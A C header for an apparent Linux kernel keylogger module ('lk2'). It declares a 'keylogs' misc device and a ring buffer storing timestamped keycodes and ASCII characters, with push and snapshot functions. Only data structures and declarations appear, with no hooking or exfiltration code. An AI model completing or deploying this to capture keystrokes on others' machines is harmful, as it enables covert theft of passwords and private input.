// SPDX-License-Identifier: GPL-2.0
#ifndef LK2_H
#define LK2_H

#include <linux/module.h>
#include <linux/miscdevice.h>
#include <linux/fs.h>

// ----- lk2_main.c ----- //

// Device node name created by lk2_main.c via miscdevice
#define LK2_DEVICE_NAME "keylogs"

struct lk2_file_ctx
{
	char *buf;
	size_t len;
};

// ----- lk2_ring.c ----- //

// Tunables
#define LK2_RING_SIZE 1024u	 // number of stored entries
#define LK2_MAX_LINE_LEN 96u // max formatted line length (incl '\n', excl '\0')

// Timestamp stored as HH:MM:SS
struct lk2_time
{
	u8 hour;
	u8 min;
	u8 sec;
};

// One key entry
struct lk2_entry
{
	struct lk2_time t;
	u16 keycode; // Linux input key code
	u8 state;	 // enum lk2_state
	char ascii;	 // 0 if not representable (layout-dependent)
};

// Ring buffer container
struct lk2_ring
{
	struct lk2_entry buf[LK2_RING_SIZE];
	u32 head;		 // next write index
	u32 count;		 // number of valid entries (<= LK2_RING_SIZE)
	spinlock_t lock; // protects head/count/buf
};

// Ring API
void lk2_ring_init(struct lk2_ring *r);
void lk2_ring_push(struct lk2_ring *r, const struct lk2_entry *e);
u32 lk2_ring_count(struct lk2_ring *r);
// Copy up to max entries into dst in chronological order; returns copied count.
u32 lk2_ring_snapshot(struct lk2_ring *r, struct lk2_entry *dst, u32 max);

#endif // LK2_H
